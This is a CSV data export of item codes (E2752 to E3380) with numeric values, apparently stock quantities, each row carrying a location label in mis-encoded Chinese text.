' ½­Òõ¿â´æ,E2752,"",6.35899999999999998579
' ½­Òõ¿â´æ,E2753,"",0.72199999999999997513
' ½­Òõ¿â´æ,E2754,"",1.66700000000000003730
' ½­Òõ¿â´æ,E2755,"",1.66700000000000003730
' ½­Òõ¿â´æ,E2756,"",0.56499999999999994671
' ½­Òõ¿â´æ,E2757,"",1.19300000000000006040
' ½­Òõ¿â´æ,E2758,"",0.82899999999999995914
' ½­Òõ¿â´æ,E2759,"",2.65300000000000002487
' ½­Òõ¿â´æ,E2760,"",1.94100000000000005862
' ½­Òõ¿â´æ,E2761,"",2.50599999999999978328
' ½­Òõ¿â´æ,E2762,"",4.36300000000000043343
' ½­Òõ¿â´æ,E2764,"",6.79399999999999959499
' ½­Òõ¿â´æ,E2765,"",7.16600000000000036948
' ½­Òõ¿â´æ,E2766,"",3.84200000000000008171
' ½­Òõ¿â´æ,E2767,"",3.88200000000000011724
' ½­Òõ¿â´æ,E2768,"",3.81099999999999994316
' ½­Òõ¿â´æ,E2769,"",4.24600000000000044054
' ½­Òõ¿â´æ,E2770,"",11.71599999999999930367
' ½­Òõ¿â´æ,E2771,"",2.23600000000000020961
' ½­Òõ¿â´æ,E2772,"",6.75100000000000033396
' ½­Òõ¿â´æ,E2774,"",7.86599999999999965894
' ½­Òõ¿â´æ,E2775,"",0.62600000000000000089
' ½­Òõ¿â´æ,E2776,"",0.94699999999999995293
' ½­Òõ¿â´æ,E2777,"",1.45700000000000007283
' ½­Òõ¿â´æ,E2778,"",2.72599999999999997868
' ½­Òõ¿â´æ,E2780,"",3.54199999999999981526
' ½­Òõ¿â´æ,E2781,"",2.28600000000000003197
' ½­Òõ¿â´æ,E2782,"",3.81099999999999994316
' ½­Òõ¿â´æ,E2783,"",2.02800000000000002487
' ½­Òõ¿â´æ,E2784,"",13.42399999999999948841
' ½­Òõ¿â´æ,E2786,"",11.62800000000000011369
' ½­Òõ¿â´æ,E2787,"",1.31400000000000005684
' ½­Òõ¿â´æ,E2789,"",6.90800000000000036238
' ½­Òõ¿â´æ,E2790,"",5.77700000000000013500
' ½­Òõ¿â´æ,E2791,"",4.32399999999999984368
' ½­Òõ¿â´æ,E2792,"",0.98299999999999998490
' ½­Òõ¿â´æ,E2793,"",5.79199999999999981526
' ½­Òõ¿â´æ,E2794,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2795,"",4.20699999999999985079
' ½­Òõ¿â´æ,E2797,"",0.69199999999999994849
' ½­Òõ¿â´æ,E2798,"",3.00599999999999978328
' ½­Òõ¿â´æ,E2799,"",2.82600000000000006750
' ½­Òõ¿â´æ,E2800,"",1.77699999999999991296
' ½­Òõ¿â´æ,E2801,"",4.08199999999999985079
' ½­Òõ¿â´æ,E2802,"",3.48799999999999998934
' ½­Òõ¿â´æ,E2803,"",1.89900000000000002132
' ½­Òõ¿â´æ,E2804,"",0.75400000000000000355
' ½­Òõ¿â´æ,E2805,"",6.94299999999999961631
' ½­Òõ¿â´æ,E2806,"",1.82600000000000006750
' ½­Òõ¿â´æ,E2808,"",2.64100000000000001421
' ½­Òõ¿â´æ,E2809,"",6.27200000000000024158
' ½­Òõ¿â´æ,E2811,"",0.94199999999999994849
' ½­Òõ¿â´æ,E2812,"",3.05799999999999982947
' ½­Òõ¿â´æ,E2813,"",3.78299999999999991829
' ½­Òõ¿â´æ,E2814,"",4.43299999999999982947
' ½­Òõ¿â´æ,E2815,"",6.26900000000000012790
' ½­Òõ¿â´æ,E2816,"",3.62300000000000022027
' ½­Òõ¿â´æ,E2817,"",2.63600000000000012079
' ½­Òõ¿â´æ,E2819,"",0.72099999999999997424
' ½­Òõ¿â´æ,E2820,"",0.76300000000000001155
' ½­Òõ¿â´æ,E2821,"",4.79199999999999981526
' ½­Òõ¿â´æ,E2822,"",2.11900000000000021672
' ½­Òõ¿â´æ,E2823,"",1.16300000000000003375
' ½­Òõ¿â´æ,E2824,"",2.62099999999999999645
' ½­Òõ¿â´æ,E2825,"",0.77700000000000002398
' ½­Òõ¿â´æ,E2826,"",4.22900000000000009237
' ½­Òõ¿â´æ,E2827,"",7.23299999999999965183
' ½­Òõ¿â´æ,E2828,"",0.84199999999999997069
' ½­Òõ¿â´æ,E2830,"",1.09200000000000008171
' ½­Òõ¿â´æ,E2831,"",3.57699999999999995737
' ½­Òõ¿â´æ,E2832,"",1.98900000000000010125
' ½­Òõ¿â´æ,E2835,"",0.82699999999999995737
' ½­Òõ¿â´æ,E2836,"",0.60799999999999998490
' ½­Òõ¿â´æ,E2837,"",0.75700000000000000622
' ½­Òõ¿â´æ,E2841,"",1.89199999999999990408
' ½­Òõ¿â´æ,E2842,"",0.89800000000000002043
' ½­Òõ¿â´æ,E2843,"",1.94900000000000006573
' ½­Òõ¿â´æ,E2844,"",2.76299999999999990052
' ½­Òõ¿â´æ,E2846,"",1.80299999999999993605
' ½­Òõ¿â´æ,E2847,"",1.12999999999999989342
' ½­Òõ¿â´æ,E2848,"",0.85399999999999998135
' ½­Òõ¿â´æ,E2849,"",8.11200000000000009948
' ½­Òõ¿â´æ,E2850,"",0.72099999999999997424
' ½­Òõ¿â´æ,E2851,"",2.88899999999999979039
' ½­Òõ¿â´æ,E2853,"",1.54899999999999993250
' ½­Òõ¿â´æ,E2854,"",1.66700000000000003730
' ½­Òõ¿â´æ,E2855,"",0.84099999999999996980
' ½­Òõ¿â´æ,E2856,"",5.51299999999999990052
' ½­Òõ¿â´æ,E2857,"",5.30799999999999982947
' ½­Òõ¿â´æ,E2858,"",5.57899999999999973710
' ½­Òõ¿â´æ,E2859,"",5.39900000000000002132
' ½­Òõ¿â´æ,E2860,"",6.58399999999999963052
' ½­Òõ¿â´æ,E2861,"",5.18100000000000004974
' ½­Òõ¿â´æ,E2862,"",3.01399999999999979039
' ½­Òõ¿â´æ,E2863,"",4.16800000000000014921
' ½­Òõ¿â´æ,E2864,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2865,"",8.80199999999999960210
' ½­Òõ¿â´æ,E2866,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2867,"",1.22500000000000008882
' ½­Òõ¿â´æ,E2868,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2869,"",2.45900000000000007461
' ½­Òõ¿â´æ,E2870,"",6.24300000000000032685
' ½­Òõ¿â´æ,E2871,"",2.63700000000000001066
' ½­Òõ¿â´æ,E2872,"",3.79400000000000003908
' ½­Òõ¿â´æ,E2873,"",3.07100000000000017408
' ½­Òõ¿â´æ,E2874,"",2.34799999999999986500
' ½­Òõ¿â´æ,E2876,"",5.57899999999999973710
' ½­Òõ¿â´æ,E2877,"",5.57899999999999973710
' ½­Òõ¿â´æ,E2878,"",5.77400000000000002132
' ½­Òõ¿â´æ,E2879,"",6.33600000000000029843
' ½­Òõ¿â´æ,E2880,"",3.62099999999999999645
' ½­Òõ¿â´æ,E2881,"",1.19399999999999995026
' ½­Òõ¿â´æ,E2882,"",1.19399999999999995026
' ½­Òõ¿â´æ,E2883,"",2.20400000000000018119
' ½­Òõ¿â´æ,E2884,"",6.78200000000000002842
' ½­Òõ¿â´æ,E2885,"",15.03400000000000069633
' ½­Òõ¿â´æ,E2886,"",1.75699999999999989519
' ½­Òõ¿â´æ,E2888,"",1.19399999999999995026
' ½­Òõ¿â´æ,E2889,"",1.28099999999999991651
' ½­Òõ¿â´æ,E2890,"",1.50699999999999989519
' ½­Òõ¿â´æ,E2891,"",1.39900000000000002132
' ½­Òõ¿â´æ,E2892,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2893,"",2.92300000000000004263
' ½­Òõ¿â´æ,E2894,"",5.57899999999999973710
' ½­Òõ¿â´æ,E2898,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2899,"",1.19399999999999995026
' ½­Òõ¿â´æ,E2900,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2901,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2902,"",1.22500000000000008882
' ½­Òõ¿â´æ,E2903,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2905,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2907,"",1.28099999999999991651
' ½­Òõ¿â´æ,E2908,"",1.28099999999999991651
' ½­Òõ¿â´æ,E2909,"",7.84900000000000019895
' ½­Òõ¿â´æ,E2910,"",1.50699999999999989519
' ½­Òõ¿â´æ,E2911,"",0.76900000000000001688
' ½­Òõ¿â´æ,E2913,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2914,"",1.48399999999999998579
' ½­Òõ¿â´æ,E2915,"",0.87900000000000000355
' ½­Òõ¿â´æ,E2916,"",2.16199999999999992184
' ½­Òõ¿â´æ,E2921,"",1.27200000000000001954
' ½­Òõ¿â´æ,E2922,"",1.43300000000000005151
' ½­Òõ¿â´æ,E2925,"",1.10000000000000008882
' ½­Òõ¿â´æ,E2926,"",9.80400000000000027001
' ½­Òõ¿â´æ,E2928,"",1.16300000000000003375
' ½­Òõ¿â´æ,E2929,"",0.98699999999999998845
' ½­Òõ¿â´æ,E2931,"",3.74400000000000021672
' ½­Òõ¿â´æ,E2932,"",0.65800000000000002931
' ½­Òõ¿â´æ,E2936,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2937,"",0.49899999999999999911
' ½­Òõ¿â´æ,E2938,"",0.51400000000000001243
' ½­Òõ¿â´æ,E2939,"",1.82600000000000006750
' ½­Òõ¿â´æ,E2940,"",0.91400000000000003464
' ½­Òõ¿â´æ,E2941,"",1.27099999999999990763
' ½­Òõ¿â´æ,E2942,"",9.78700000000000081002
' ½­Òõ¿â´æ,E2943,"",6.93200000000000038369
' ½­Òõ¿â´æ,E2944,"",2.68599999999999994316
' ½­Òõ¿â´æ,E2945,"",0.34899999999999997691
' ½­Òõ¿â´æ,E2946,"",2.38899999999999979039
' ½­Òõ¿â´æ,E2947,"",2.20400000000000018119
' ½­Òõ¿â´æ,E2952,"",1.43399999999999994138
' ½­Òõ¿â´æ,E2953,"",2.15300000000000002487
' ½­Òõ¿â´æ,E2954,"",11.00300000000000011369
' ½­Òõ¿â´æ,E2955,"",1.59200000000000008171
' ½­Òõ¿â´æ,E2956,"",0.67100000000000004086
' ½­Òõ¿â´æ,E2957,"",0.65600000000000002753
' ½­Òõ¿â´æ,E2958,"",8.10100000000000086686
' ½­Òõ¿â´æ,E2959,"",2.77400000000000002132
' ½­Òõ¿â´æ,E2964,"",0.95399999999999995914
' ½­Òõ¿â´æ,E2965,"",1.67900000000000004796
' ½­Òõ¿â´æ,E2967,"",1.14300000000000001599
' ½­Òõ¿â´æ,E2968,"",0.63700000000000001066
' ½­Òõ¿â´æ,E2969,"",0.48599999999999998757
' ½­Òõ¿â´æ,E2970,"",0.59299999999999997158
' ½­Òõ¿â´æ,E2971,"",1.41199999999999992184
' ½­Òõ¿â´æ,E2973,"",0.74599999999999999645
' ½­Òõ¿â´æ,E2974,"",2.28399999999999980815
' ½­Òõ¿â´æ,E2976,"",3.01900000000000012790
' ½­Òõ¿â´æ,E2977,"",0.77700000000000002398
' ½­Òõ¿â´æ,E2982,"",6.73200000000000020606
' ½­Òõ¿â´æ,E2983,"",0.78800000000000003375
' ½­Òõ¿â´æ,E2984,"",0.81599999999999994760
' ½­Òõ¿â´æ,E2985,"",4.23099999999999987210
' ½­Òõ¿â´æ,E2986,"",0.55000000000000004441
' ½­Òõ¿â´æ,E2987,"",0.60799999999999998490
' ½­Òõ¿â´æ,E2988,"",0.98699999999999998845
' ½­Òõ¿â´æ,E2989,"",1.05899999999999994138
' ½­Òõ¿â´æ,E2991,"",0.75400000000000000355
' ½­Òõ¿â´æ,E2992,"",1.32699999999999995737
' ½­Òõ¿â´æ,E2993,"",2.28200000000000002842
' ½­Òõ¿â´æ,E2996,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2997,"",6.67699999999999960210
' ½­Òõ¿â´æ,E2999,"",7.51100000000000012079
' ½­Òõ¿â´æ,E3000,"",5.09199999999999963762
' ½­Òõ¿â´æ,E3001,"",2.28200000000000002842
' ½­Òõ¿â´æ,E3004,"",5.36399999999999987921
' ½­Òõ¿â´æ,E3005,"",0.98899999999999999023
' ½­Òõ¿â´æ,E3006,"",1.14300000000000001599
' ½­Òõ¿â´æ,E3007,"",1.78400000000000003020
' ½­Òõ¿â´æ,E3008,"",4.86899999999999977263
' ½­Òõ¿â´æ,E3009,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3010,"",3.47199999999999997513
' ½­Òõ¿â´æ,E3013,"",1.71700000000000008171
' ½­Òõ¿â´æ,E3014,"",2.53200000000000002842
' ½­Òõ¿â´æ,E3015,"",0.81799999999999994937
' ½­Òõ¿â´æ,E3017,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3019,"",3.34600000000000008527
' ½­Òõ¿â´æ,E3021,"",1.51099999999999989875
' ½­Òõ¿â´æ,E3022,"",8.34500000000000063949
' ½­Òõ¿â´æ,E3023,"",8.66799999999999926104
' ½­Òõ¿â´æ,E3024,"",8.66799999999999926104
' ½­Òõ¿â´æ,E3025,"",1.83699999999999996625
' ½­Òõ¿â´æ,E3026,"",11.07099999999999972999
' ½­Òõ¿â´æ,E3028,"",4.22900000000000009237
' ½­Òõ¿â´æ,E3029,"",2.27199999999999979750
' ½­Òõ¿â´æ,E3030,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3031,"",0.92600000000000004530
' ½­Òõ¿â´æ,E3032,"",3.47800000000000020250
' ½­Òõ¿â´æ,E3033,"",1.47199999999999997513
' ½­Òõ¿â´æ,E3034,"",11.97100000000000008527
' ½­Òõ¿â´æ,E3035,"",12.13299999999999911893
' ½­Òõ¿â´æ,E3036,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3037,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3039,"",1.45700000000000007283
' ½­Òõ¿â´æ,E3041,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3042,"",1.39300000000000001599
' ½­Òõ¿â´æ,E3043,"",4.24899999999999966604
' ½­Òõ¿â´æ,E3044,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3045,"",1.57800000000000006928
' ½­Òõ¿â´æ,E3046,"",6.99099999999999965894
' ½­Òõ¿â´æ,E3047,"",9.57399999999999984368
' ½­Òõ¿â´æ,E3048,"",4.22900000000000009237
' ½­Òõ¿â´æ,E3049,"",1.16300000000000003375
' ½­Òõ¿â´æ,E3050,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3051,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3052,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3053,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3054,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3055,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3056,"",5.04800000000000004263
' ½­Òõ¿â´æ,E3059,"",1.52699999999999991296
' ½­Òõ¿â´æ,E3060,"",0.70899999999999996358
' ½­Òõ¿â´æ,E3061,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3062,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3063,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3064,"",0.96099999999999996536
' ½­Òõ¿â´æ,E3065,"",0.60399999999999998135
' ½­Òõ¿â´æ,E3066,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3070,"",0.92700000000000004619
' ½­Òõ¿â´æ,E3071,"",3.36699999999999999289
' ½­Òõ¿â´æ,E3075,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3077,"",0.89900000000000002132
' ½­Òõ¿â´æ,E3078,"",1.49799999999999999822
' ½­Òõ¿â´æ,E3079,"",2.59200000000000008171
' ½­Òõ¿â´æ,E3080,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3081,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3082,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3089,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3090,"",2.35300000000000020250
' ½­Òõ¿â´æ,E3092,"",0.80300000000000004707
' ½­Òõ¿â´æ,E3094,"",0.87900000000000000355
' ½­Òõ¿â´æ,E3095,"",2.16699999999999981526
' ½­Òõ¿â´æ,E3096,"",9.02800000000000046896
' ½­Òõ¿â´æ,E3097,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3098,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3099,"",1.88399999999999989697
' ½­Òõ¿â´æ,E3100,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3101,"",1.45700000000000007283
' ½­Òõ¿â´æ,E3104,"",2.03799999999999981171
' ½­Òõ¿â´æ,E3105,"",1.14300000000000001599
' ½­Òõ¿â´æ,E3107,"",1.46300000000000007816
' ½­Òõ¿â´æ,E3108,"",1.59200000000000008171
' ½­Òõ¿â´æ,E3109,"",8.43800000000000061107
' ½­Òõ¿â´æ,E3110,"",2.39299999999999979394
' ½­Òõ¿â´æ,E3111,"",1.40799999999999991829
' ½­Òõ¿â´æ,E3112,"",5.79300000000000014921
' ½­Òõ¿â´æ,E3113,"",5.82899999999999973710
' ½­Òõ¿â´æ,E3114,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3115,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3116,"",2.16699999999999981526
' ½­Òõ¿â´æ,E3117,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3119,"",0.84099999999999996980
' ½­Òõ¿â´æ,E3120,"",1.30299999999999993605
' ½­Òõ¿â´æ,E3121,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3122,"",1.29800000000000004263
' ½­Òõ¿â´æ,E3124,"",1.39900000000000002132
' ½­Òõ¿â´æ,E3128,"",1.28099999999999991651
' ½­Òõ¿â´æ,E3129,"",2.39299999999999979394
' ½­Òõ¿â´æ,E3130,"",1.50699999999999989519
' ½­Òõ¿â´æ,E3131,"",0.78800000000000003375
' ½­Òõ¿â´æ,E3132,"",0.73299999999999998490
' ½­Òõ¿â´æ,E3133,"",1.28699999999999992184
' ½­Òõ¿â´æ,E3135,"",18.19900000000000162004
' ½­Òõ¿â´æ,E3136,"",2.15399999999999991473
' ½­Òõ¿â´æ,E3138,"",4.86599999999999965894
' ½­Òõ¿â´æ,E3139,"",0.62900000000000000355
' ½­Òõ¿â´æ,E3145,"",1.22500000000000008882
' ½­Òõ¿â´æ,E3146,"",1.50699999999999989519
' ½­Òõ¿â´æ,E3148,"",7.04600000000000026290
' ½­Òõ¿â´æ,E3149,"",0.57999999999999996003
' ½­Òõ¿â´æ,E3152,"",5.88799999999999990052
' ½­Òõ¿â´æ,E3154,"",9.29800000000000004263
' ½­Òõ¿â´æ,E3155,"",1.48599999999999998757
' ½­Òõ¿â´æ,E3157,"",1.71700000000000008171
' ½­Òõ¿â´æ,E3158,"",1.40799999999999991829
' ½­Òõ¿â´æ,E3161,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3162,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3163,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3164,"",4.29600000000000026290
' ½­Òõ¿â´æ,E3165,"",5.48700000000000009948
' ½­Òõ¿â´æ,E3166,"",1.34200000000000008171
' ½­Òõ¿â´æ,E3167,"",2.02899999999999991473
' ½­Òõ¿â´æ,E3173,"",0.83099999999999996092
' ½­Òõ¿â´æ,E3174,"",1.20199999999999995737
' ½­Òõ¿â´æ,E3175,"",1.22900000000000009237
' ½­Òõ¿â´æ,E3176,"",0.82699999999999995737
' ½­Òõ¿â´æ,E3177,"",0.98199999999999998401
' ½­Òõ¿â´æ,E3179,"",8.66799999999999926104
' ½­Òõ¿â´æ,E3180,"",1.42799999999999993605
' ½­Òõ¿â´æ,E3181,"",12.53299999999999947420
' ½­Òõ¿â´æ,E3182,"",2.63099999999999978328
' ½­Òõ¿â´æ,E3183,"",11.22600000000000086686
' ½­Òõ¿â´æ,E3185,"",2.39599999999999990763
' ½­Òõ¿â´æ,E3186,"",1.56800000000000006040
' ½­Òõ¿â´æ,E3188,"",14.82399999999999984368
' ½­Òõ¿â´æ,E3189,"",2.51200000000000001066
' ½­Òõ¿â´æ,E3190,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3191,"",0.76100000000000000977
' ½­Òõ¿â´æ,E3192,"",0.88800000000000001155
' ½­Òõ¿â´æ,E3193,"",16.93700000000000116529
' ½­Òõ¿â´æ,E3194,"",4.02200000000000024158
' ½­Òõ¿â´æ,E3195,"",2.19799999999999995381
' ½­Òõ¿â´æ,E3196,"",2.15399999999999991473
' ½­Òõ¿â´æ,E3197,"",0.75200000000000000178
' ½­Òõ¿â´æ,E3198,"",0.71599999999999996980
' ½­Òõ¿â´æ,E3200,"",0.56499999999999994671
' ½­Òõ¿â´æ,E3201,"",0.92100000000000004086
' ½­Òõ¿â´æ,E3202,"",1.78400000000000003020
' ½­Òõ¿â´æ,E3203,"",4.46199999999999974420
' ½­Òõ¿â´æ,E3204,"",2.28600000000000003197
' ½­Òõ¿â´æ,E3205,"",3.47199999999999997513
' ½­Òõ¿â´æ,E3206,"",5.68599999999999994316
' ½­Òõ¿â´æ,E3207,"",2.12199999999999988631
' ½­Òõ¿â´æ,E3208,"",6.44800000000000039790
' ½­Òõ¿â´æ,E3209,"",1.92199999999999993072
' ½­Òõ¿â´æ,E3210,"",3.01699999999999990408
' ½­Òõ¿â´æ,E3211,"",0.78700000000000003286
' ½­Òõ¿â´æ,E3212,"",1.15999999999999992006
' ½­Òõ¿â´æ,E3213,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3214,"",1.66700000000000003730
' ½­Òõ¿â´æ,E3215,"",1.63900000000000001243
' ½­Òõ¿â´æ,E3216,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3217,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3218,"",0.95799999999999996270
' ½­Òõ¿â´æ,E3219,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3220,"",0.97299999999999997602
' ½­Òõ¿â´æ,E3221,"",0.94099999999999994760
' ½­Òõ¿â´æ,E3222,"",1.52600000000000002309
' ½­Òõ¿â´æ,E3224,"",2.01699999999999990408
' ½­Òõ¿â´æ,E3226,"",6.10799999999999965183
' ½­Òõ¿â´æ,E3227,"",0.93400000000000005240
' ½­Òõ¿â´æ,E3228,"",0.71399999999999996803
' ½­Òõ¿â´æ,E3230,"",0.90100000000000002309
' ½­Òõ¿â´æ,E3231,"",1.20100000000000006750
' ½­Òõ¿â´æ,E3232,"",0.98899999999999999023
' ½­Òõ¿â´æ,E3233,"",0.88600000000000000977
' ½­Òõ¿â´æ,E3235,"",1.15399999999999991473
' ½­Òõ¿â´æ,E3236,"",2.59299999999999997158
' ½­Òõ¿â´æ,E3237,"",1.88399999999999989697
' ½­Òõ¿â´æ,E3239,"",0.99899999999999999911
' ½­Òõ¿â´æ,E3240,"",0.84799999999999997602
' ½­Òõ¿â´æ,E3241,"",1.05899999999999994138
' ½­Òõ¿â´æ,E3242,"",1.09000000000000007994
' ½­Òõ¿â´æ,E3243,"",8.47799999999999975842
' ½­Òõ¿â´æ,E3244,"",7.92900000000000027001
' ½­Òõ¿â´æ,E3245,"",6.76100000000000012079
' ½­Òõ¿â´æ,E3246,"",14.89899999999999913314
' ½­Òõ¿â´æ,E3247,"",0.88300000000000000711
' ½­Òõ¿â´æ,E3248,"",0.84699999999999997513
' ½­Òõ¿â´æ,E3249,"",0.70299999999999995826
' ½­Òõ¿â´æ,E3250,"",0.65600000000000002753
' ½­Òõ¿â´æ,E3252,"",3.67399999999999993250
' ½­Òõ¿â´æ,E3258,"",1.67399999999999993250
' ½­Òõ¿â´æ,E3259,"",1.67399999999999993250
' ½­Òõ¿â´æ,E3260,"",1.04099999999999992539
' ½­Òõ¿â´æ,E3261,"",1.20700000000000007283
' ½­Òõ¿â´æ,E3262,"",1.24300000000000010481
' ½­Òõ¿â´æ,E3263,"",1.13799999999999990052
' ½­Òõ¿â´æ,E3264,"",0.79200000000000003730
' ½­Òõ¿â´æ,E3265,"",1.24399999999999999467
' ½­Òõ¿â´æ,E3266,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3267,"",3.26699999999999990408
' ½­Òõ¿â´æ,E3268,"",4.36300000000000043343
' ½­Òõ¿â´æ,E3270,"",1.18700000000000005507
' ½­Òõ¿â´æ,E3271,"",9.51800000000000068212
' ½­Òõ¿â´æ,E3275,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3276,"",0.91300000000000003375
' ½­Òõ¿â´æ,E3277,"",1.00200000000000000178
' ½­Òõ¿â´æ,E3278,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3279,"",0.94199999999999994849
' ½­Òõ¿â´æ,E3281,"",3.46799999999999997158
' ½­Òõ¿â´æ,E3282,"",0.95399999999999995914
' ½­Òõ¿â´æ,E3283,"",4.07800000000000029132
' ½­Òõ¿â´æ,E3284,"",0.95399999999999995914
' ½­Òõ¿â´æ,E3285,"",3.75300000000000011369
' ½­Òõ¿â´æ,E3287,"",1.06800000000000006040
' ½­Òõ¿â´æ,E3288,"",3.28799999999999981171
' ½­Òõ¿â´æ,E3289,"",12.95299999999999940314
' ½­Òõ¿â´æ,E3290,"",8.73399999999999998579
' ½­Òõ¿â´æ,E3291,"",3.29899999999999993250
' ½­Òõ¿â´æ,E3292,"",2.54099999999999992539
' ½­Òõ¿â´æ,E3293,"",1.64900000000000002132
' ½­Òõ¿â´æ,E3294,"",5.37300000000000022027
' ½­Òõ¿â´æ,E3296,"",0.60799999999999998490
' ½­Òõ¿â´æ,E3298,"",0.79200000000000003730
' ½­Òõ¿â´æ,E3299,"",0.81100000000000005418
' ½­Òõ¿â´æ,E3301,"",1.03600000000000003197
' ½­Òõ¿â´æ,E3302,"",0.47099999999999997424
' ½­Òõ¿â´æ,E3303,"",1.03600000000000003197
' ½­Òõ¿â´æ,E3304,"",1.89399999999999990585
' ½­Òõ¿â´æ,E3305,"",1.74399999999999999467
' ½­Òõ¿â´æ,E3306,"",0.59299999999999997158
' ½­Òõ¿â´æ,E3307,"",1.00499999999999989342
' ½­Òõ¿â´æ,E3308,"",1.99399999999999999467
' ½­Òõ¿â´æ,E3309,"",1.48799999999999998934
' ½­Òõ¿â´æ,E3313,"",0.60099999999999997868
' ½­Òõ¿â´æ,E3314,"",0.69299999999999994937
' ½­Òõ¿â´æ,E3316,"",0.86399999999999999023
' ½­Òõ¿â´æ,E3317,"",0.57699999999999995737
' ½­Òõ¿â´æ,E3318,"",2.90799999999999991829
' ½­Òõ¿â´æ,E3319,"",6.02700000000000013500
' ½­Òõ¿â´æ,E3320,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3321,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3322,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3323,"",4.14499999999999957367
' ½­Òõ¿â´æ,E3324,"",3.06099999999999994316
' ½­Òõ¿â´æ,E3325,"",12.29599999999999937472
' ½­Òõ¿â´æ,E3327,"",1.28099999999999991651
' ½­Òõ¿â´æ,E3328,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3329,"",1.00499999999999989342
' ½­Òõ¿â´æ,E3330,"",1.26200000000000001066
' ½­Òõ¿â´æ,E3331,"",4.00800000000000000711
' ½­Òõ¿â´æ,E3332,"",2.76299999999999990052
' ½­Òõ¿â´æ,E3333,"",4.00800000000000000711
' ½­Òõ¿â´æ,E3336,"",2.28600000000000003197
' ½­Òõ¿â´æ,E3337,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3338,"",2.02800000000000002487
' ½­Òõ¿â´æ,E3339,"",2.02800000000000002487
' ½­Òõ¿â´æ,E3340,"",1.48799999999999998934
' ½­Òõ¿â´æ,E3341,"",1.48799999999999998934
' ½­Òõ¿â´æ,E3342,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3343,"",2.76299999999999990052
' ½­Òõ¿â´æ,E3344,"",0.79100000000000003642
' ½­Òõ¿â´æ,E3346,"",0.76300000000000001155
' ½­Òõ¿â´æ,E3347,"",0.83899999999999996803
' ½­Òõ¿â´æ,E3348,"",0.83399999999999996358
' ½­Òõ¿â´æ,E3349,"",0.59699999999999997513
' ½­Òõ¿â´æ,E3350,"",0.83199999999999996181
' ½­Òõ¿â´æ,E3351,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3352,"",0.66800000000000003819
' ½­Òõ¿â´æ,E3354,"",2.33099999999999996092
' ½­Òõ¿â´æ,E3355,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3356,"",1.21599999999999996980
' ½­Òõ¿â´æ,E3357,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3358,"",1.12999999999999989342
' ½­Òõ¿â´æ,E3359,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3360,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3361,"",0.75400000000000000355
' ½­Òõ¿â´æ,E3362,"",1.03600000000000003197
' ½­Òõ¿â´æ,E3363,"",1.32699999999999995737
' ½­Òõ¿â´æ,E3366,"",4.00800000000000000711
' ½­Òõ¿â´æ,E3367,"",4.43299999999999982947
' ½­Òõ¿â´æ,E3368,"",0.76900000000000001688
' ½­Òõ¿â´æ,E3371,"",4.05799999999999982947
' ½­Òõ¿â´æ,E3372,"",2.64900000000000002132
' ½­Òõ¿â´æ,E3373,"",0.94599999999999995204
' ½­Òõ¿â´æ,E3374,"",0.83899999999999996803
' ½­Òõ¿â´æ,E3375,"",3.83700000000000018829
' ½­Òõ¿â´æ,E3376,"",2.33700000000000018829
' ½­Òõ¿â´æ,E3377,"",0.69199999999999994849
' ½­Òõ¿â´æ,E3378,"",0.65600000000000002753
' ½­Òõ¿â´æ,E3379,"",0.65600000000000002753
' ½­Òõ¿â´æ,E3380,"",0.63200000000000000622
